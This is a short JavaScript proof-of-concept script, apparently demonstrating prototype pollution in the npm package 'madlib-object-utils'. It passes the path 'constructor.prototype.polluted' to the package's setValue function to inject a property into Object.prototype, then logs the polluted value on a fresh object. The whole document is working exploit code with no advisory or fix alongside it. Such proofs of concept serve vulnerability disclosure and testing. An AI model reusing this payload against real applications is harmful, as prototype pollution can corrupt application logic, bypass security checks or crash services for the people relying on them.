var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const objectUtils = require('madlib-object-utils');
objectUtils.setValue('constructor.prototype.polluted', obj, 'yes');
console.log({}.polluted);